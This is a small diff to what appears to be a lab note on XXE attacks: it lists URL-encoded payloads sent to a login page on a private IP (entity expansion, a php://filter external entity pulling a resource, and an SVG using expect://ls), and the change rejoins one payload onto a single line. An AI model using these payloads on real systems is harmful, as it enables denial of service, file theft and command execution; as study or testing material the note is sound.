@@ -91,7 +91,6 @@ cat  /var/log/nginx/access.log
     *  http://192.168.1.44/login.php?xml=%3C!ENTITY%20lol2%20%22&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;%22%3E
     *  http://192.168.1.44/login.php?xml=%3C!ENTITY%20ac%20SYSTEM%20%22php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php%22%3E]%3E
     *  http://192.168.1.44/login.php?xml=%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20xmlns:xlink=%22http://www.w3.org/1999/xlink%22%20width=%22300%22%20version=%221.1%22%20height=%22200%22%3E%20%3Cimage%20xlink:href=%22expect://ls%22%3E%3C/image%3E%20%3C/svg%3E
-* Access Control with PHP http://192.168.1.44/login.php?xml=%
-* 3C!ENTITY%20ac%20SYSTEM%20%22php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php%22%3E]%3E
+* Access Control with PHP http://192.168.1.44/login.php?xml=%3C!ENTITY%20ac%20SYSTEM%20%22php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php%22%3E]%3E
 
 
